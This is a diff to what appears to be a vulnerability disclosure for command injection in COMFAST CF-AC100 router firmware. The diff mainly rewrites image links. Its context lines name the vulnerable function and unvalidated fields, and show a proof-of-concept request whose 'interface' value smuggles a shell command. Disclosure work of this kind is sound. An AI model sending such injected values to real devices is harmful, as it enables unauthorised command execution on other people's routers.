@@ -14,7 +14,7 @@ A command injection vulnerability has been discovered in COMFAST CF-AC100 V2.6.0
 
 ### Vulnerability Details
 
-![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-23-17-17-39-b100ced0-ae76-419f-9430-a3312246f82e.png)
+![](../main/images/026-02-23-17-17-39-b100ced0-ae76-419f-9430-a3312246f82e.png)
 
 The trigger point is located in the `sub_41F1C8` method of the `webmggnt` component. Here, the `interface` and `display_name` fields are not validated before being concatenated using `sprintf` and executed using `system`.
 
@@ -54,4 +54,5 @@ Cookie: language=sc; COMFAST_SESSIONID=0200a8c0-4261ffffffc85cffffff8a5f-6b8b456
 {"interface":"; echo test > /tmp/test.txt #","display_name":"1111"}
 ```
 
-![](C:\Users\user\AppData\Roaming\marktext\images\2026-02-23-18-23-16-76c2549c-d00d-4c8e-8892-0c115debe5d5.png)
+![](../main/images/026-02-23-18-23-16-76c2549c-d00d-4c8e-8892-0c115debe5d5.png)
+
